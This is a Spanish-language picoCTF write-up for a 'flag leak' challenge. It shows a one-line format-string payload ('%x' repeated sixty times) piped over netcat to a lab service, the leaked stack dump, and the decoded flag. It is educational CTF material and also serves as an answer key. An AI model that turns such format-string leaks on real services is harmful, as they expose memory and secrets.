## Objetivo
Story telling class 1/2I'm just copying and pasting with this [program](https://artifacts.picoctf.net/c/91/vuln). What can go wrong? You can view source [here](https://artifacts.picoctf.net/c/91/vuln.c). And connect with it using:`nc saturn.picoctf.net 53857`

Hint
 - Format Strings
## Solucion

``` bash
┌──(wil㉿DESKTOP-FKOIV4I)-[~/picoCTF/binexp/parte-1/flag-leak]
└─$ python3 -c 'print("%x"*60)' | nc saturn.picoctf.net 51338
Tell me a story and then I'll tell you one >> Here's a story -
ffa054b0ffa054d08049346782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825eb454d00eb2d9ab06f6369707b4654436b34334c5f676e3167346c466666305f3474535f315f6b63623261317d613235fbad2000d3a082000eb490990804c00080494100804c000ffa0559880494182ffa05644ffa056500ffa055b0
```

Despues uso de cyberchef con formulas de swap endianness y from hex
```
picoCTF{L34k1ng_Fl4g_0ff_St4ck_11a2b52a}
```
## Notas adicionales
## Referencias
- [Format string attack | OWASP Foundation](https://owasp.org/www-community/attacks/Format_string_attack)